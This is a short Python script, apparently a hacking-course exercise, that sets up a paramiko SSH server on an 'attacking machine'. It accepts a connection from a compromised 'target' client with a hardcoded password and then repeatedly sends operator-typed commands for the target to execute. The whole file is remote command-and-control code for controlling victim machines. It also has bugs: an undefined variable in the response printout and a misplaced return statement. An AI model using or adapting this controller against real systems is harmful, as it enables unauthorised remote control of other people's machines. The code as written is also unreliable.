#Now we write a program that creates an SSH Server that we will run on our attacking machine.

#This SSH Server will allow us to send commands from our malicious machine   to the   target machine(this SSH Client)

import os #allows theh program to use  operating system dependent functionality
import paramiko #module for SSH connections
import socket #module to crate socekt objects
import sys #gives low level control for how the program interacts with the OS
import threading

import paramiko.transport #for initiating multithreading in the program

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return
    paramiko.OPEN_FAILED_ADIMINSTRATIVELY_PROHIBITED


    def check_auth_password(self, username, password):
        if(username=='cam') and (password == 'secret'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = input('This script is to be run on the attacking machine. Enter the IP of your current machine: ')
    port = int(input('Enter the port on this machine you want to listen on: '))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen(100)
        print('[*] listening for connection...')
        client, addr = sock.accept() #accept the connection from the client.   Accpet the connection to target machien
    
    except Exception as e:
        exception = str(e)
        print(f'[*] Listening failed: {exception}')
        sys.exit(1)

    else:
        print(f'[*] Connected to the client (target): {addr[0]}:{addr[1]}')

    bhSession = paramiko.Transport(client)

    bhSession.add_server_key(HOSTKEY)

    server = Server()

    bhSession.start_server(server=server)

    chan = bhSession.accept(20)

    if chan is None:
        print('*** No Channel')
        sys.exit(1)

    print('[*] Authenticated')

    print(chan.recv(1024))

    chan.send('Welcome to SSH')

    try:
        while True:
            command = input('Enter command to execute on target: ')
            if command != 'exit':
                chan.send(command)
                response = chan.recv(8192)
                print(r.decode())
            
            else:
                chan.send('exit')
                print('exiting...')
                bhSession.close()
                sys.exit(1)
                break

            
    except KeyboardInterrupt:
        bhSession.close()
        sys.exit(1)
